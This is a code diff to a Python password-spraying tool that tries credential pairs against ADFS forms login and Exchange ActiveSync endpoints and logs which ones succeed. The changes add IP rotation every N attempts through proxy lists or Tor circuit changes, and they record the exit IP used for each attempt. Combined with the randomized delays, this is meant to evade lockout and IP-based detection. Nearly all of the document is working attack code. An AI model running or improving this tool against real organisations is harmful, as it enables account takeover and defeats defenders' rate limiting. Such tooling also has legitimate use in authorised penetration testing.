@@ -27,6 +27,7 @@ def get_args():
 	parser.add_argument('-m', '--min_time', required=False, default=30, action='store', help='Minimum seconds. Default: 300')
 	parser.add_argument('-M', '--max_time', required=False, default=60, action='store', help='Maximum seconds. Default: 600')
 	parser.add_argument('-r', '--randomize', required=False, default=True, action='store', help='Randomize pairs of credentials. Default: True')
+	parser.add_argument('-n', '--number_requests_per_ip', required=False, default=1, action='store', help='Number of requests per IP address. Default: 1')
 	parser.add_argument('-l', '--logfile', required=False, default="tested.txt", action='store', help='Log file. Default: tested.txt')
 	parser.add_argument('-d', '--debug', required=False, default=True, action='store', help='Debug mode. Default: False')
 	parser.add_argument('-pl', '--proxy_list', required=False, default=None, action='store', help='Proxy list')
@@ -35,14 +36,15 @@ def get_args():
 	return parser
 
 
-def write_tested(user,password,test_credentials_file,status):
+def write_tested(user,password,test_credentials_file,status,ip_):
 	current_time = time.strftime("%H:%M:%S",time.localtime())
-	current_ip = requests.get('https://api.ipify.org').text
+	#current_ip = requests.get('https://api.ipify.org').text.replace("\n","")
+	current_ip = ip_
 	with open(test_credentials_file, "a") as f:
 		f.write(user+":"+password+","+status+","+current_time+","+current_ip+"\n")
 
 
-def check_dafs_user(dafs_url,credential,debug,proxy,test_credentials_file,counter,pairs):
+def check_dafs_user(dafs_url,credential,debug,proxy,test_credentials_file,counter,pairs, ip_):
 	if "dafs" in dafs_url:
 		origin_field  = dafs_url.split("adfs")[0]
 	else:
@@ -61,11 +63,11 @@ def check_dafs_user(dafs_url,credential,debug,proxy,test_credentials_file,counte
 	data = {"UserName": user, "Password": password, "AuthMethod":"FormsAuthentication"}
 	resp = requests.post(dafs_url, data = data, headers = headers, verify = False, proxies = proxy)
 	if resp.history != []:
-		write_tested(user,password,test_credentials_file, "CORRECT")
+		write_tested(user,password,test_credentials_file, "CORRECT",ip_)
 		print("[%s/%s] CORRECT credentials found: %s:%s"%(counter,pairs,user,password))
 		return True
 	elif resp.history == []:
-		write_tested(user,password,test_credentials_file, "FAILED")
+		write_tested(user,password,test_credentials_file, "FAILED",ip_)
 		if debug: print("[%s/%s] Incorrect credentials: %s:%s"%(counter,pairs,user,password))
 		return False
 	if resp.status_code != 200:
@@ -73,7 +75,7 @@ def check_dafs_user(dafs_url,credential,debug,proxy,test_credentials_file,counte
 		sys.exit(1)
 
 
-def check_activesync_user(credential,debug,proxy,test_credentials_file,counter,pairs):
+def check_activesync_user(credential,debug,proxy,test_credentials_file,counter,pairs, ip_):
 	user = credential[0]
 	password = credential[1]
 	s = requests.Session()
@@ -84,11 +86,11 @@ def check_activesync_user(credential,debug,proxy,test_credentials_file,counter,p
 	if debug: print("[%s/%s] Response status code: %s" % (counter,pairs,response.status_code))
 	if response.status_code == 200 or response.status_code == 505:
 		print("[%s/%s] CORRECT credentials found: %s:%s"%(counter,pairs,user,password))
-		write_tested(user,password,test_credentials_file, "CORRECT")
+		write_tested(user,password,test_credentials_file,"CORRECT",ip_)
 		return True
 	else:
 		if debug: print("[%s/%s] Incorrect credentials: %s:%s"%(counter,pairs,user,password))
-		write_tested(user,password,test_credentials_file, "FAILED")
+		write_tested(user,password,test_credentials_file,"FAILED",ip_)
 		return False
 
 
@@ -120,8 +122,10 @@ def change_tor_ip(controller, debug):
 		print("[!] Error changing IP address using Tor")
 		pass
 	new_ip = requests.get('https://api.ipify.org').text.replace("\n","")
+	if "Application Error" in new_ip:
+		new_ip = "Error_Getting_Ip" 
 	return new_ip
-	
+
 
 def main():
 	# Get arguments
@@ -152,12 +156,13 @@ def main():
 		users =      [c.split(":")[0] for c in creds]
 		passwords =  [c.split(":")[1] for c in creds]
 		pairs =      [(c.split(":")[0],c.split(":")[1]) for c in creds]
-	
+
 
 	proxy_list = open(args.proxy_list).read().splitlines() if args.proxy_list is not None else None
 	tor_password = args.tor_password if args.tor_password is not None else None
 	debug =      json.loads(args.debug.lower()) if isinstance(args.debug,str) else args.debug
 	randomize =  json.loads(args.randomize.lower()) if isinstance(args.randomize,str) else args.randomize
+	number_requests_per_ip = int(args.number_requests_per_ip)
 
 	# Delete already tested pairs of username and password
 	test_credentials_file = args.logfile
@@ -165,21 +170,34 @@ def main():
 		tested_pairs = open(test_credentials_file).read().splitlines()
 		tested_pairs = [(p.split(",")[0].split(":")[0], p.split(",")[0].split(":")[1]) for p in tested_pairs]
 		pairs =        [p for p in pairs if p not in tested_pairs]
-	
+
 	# Randomize the combination of users and passwords
 	if randomize:
 		random.shuffle(pairs)
 
 	# Get DAFS url and create a web session
+	new_ip = ""
+	if tor_password is not None:
+		try:
+			controller = Controller.from_port(port=9051)
+			controller.authenticate(password=tor_password)
+			socks.setdefaultproxy(proxy_type=socks.PROXY_TYPE_SOCKS5, addr="127.0.0.1", port=9050)
+			socket.socket = socks.socksocket
+		except:
+			pass
+		if debug: print("[+] Changing IP address")
+		new_ip = change_tor_ip(controller, debug)
+		if debug: print("[+] New IP address: %s"%(new_ip))
+
 	dafs_url = calculate_values(args.target)
 
-	if debug: 
+	if debug:
 		print ("[+] ADFS url: %s"%(dafs_url))
 		print ("[+] Total users:         %d"   %(len(users)))
 		print ("[+] Total passwords:     %d"   %(len(passwords)))
-		print ("[+] Total combinations:  %d"   %(len(pairs)))
-		print ("[+] External IP address: %s\n" %(requests.get('https://api.ipify.org').text.replace("\n","")))
-	
+		print ("[+] Total combinations:  %d\n"   %(len(pairs)))
+		#print ("[+] External IP address: %s\n" %(requests.get('https://api.ipify.org').text.replace("\n","")))
+
 	counter = 0
 	correct_users_list = []
 	proxy = None
@@ -187,9 +205,9 @@ def main():
 		if credential[0] not in correct_users_list:
 			counter += 1
 			random_seconds = random.randint(int(args.min_time), int(args.max_time))
-			if proxy_list is not None:
+			if proxy_list is not None and ((counter) % number_requests_per_ip == 0):
 				proxy = {"http": proxy_list[counter%len(proxy_list)], "https": proxy_list[counter%len(proxy_list)]}
-			if tor_password is not None:
+			if tor_password is not None and ((counter) % number_requests_per_ip == 0):
 				try:
 					controller = Controller.from_port(port=9051)
 					controller.authenticate(password=tor_password)
@@ -200,12 +218,13 @@ def main():
 				#if debug: print("[%s/%s] Changing IP address"%(str(counter), str(len(pairs))))
 				new_ip = change_tor_ip(controller, debug)
 				if debug: print("[%s/%s] New IP address: %s"%(str(counter), str(len(pairs)), new_ip))
-			if debug: print("[%s/%s] Testing %s:%s\n[%s/%s] Waiting time:   %s seconds"%(str(counter), str(len(pairs)),credential[0], credential[1],str(counter), str(len(pairs)),random_seconds))
+			if debug: print("[%s/%s] Waiting time:   %s seconds"%(str(counter), str(len(pairs)),random_seconds))
 			time.sleep(random_seconds)
+			#if debug: print("[%s/%s] Testing %s:%s"%(str(counter), str(len(pairs)),credential[0], credential[1]))
 			if dafs_url != active_sync_url:
-				correct_user = check_dafs_user(dafs_url,credential,debug,proxy,test_credentials_file,str(counter), str(len(pairs)))
+				correct_user = check_dafs_user(dafs_url,credential,debug,proxy,test_credentials_file,str(counter), str(len(pairs)), new_ip)
 			else:
-				correct_user = check_activesync_user(credential,debug,proxy,test_credentials_file,str(counter), str(len(pairs)))
+				correct_user = check_activesync_user(credential,debug,proxy,test_credentials_file,str(counter), str(len(pairs)), new_ip)
 			if correct_user:
 				correct_users_list.append(credential[0])
 
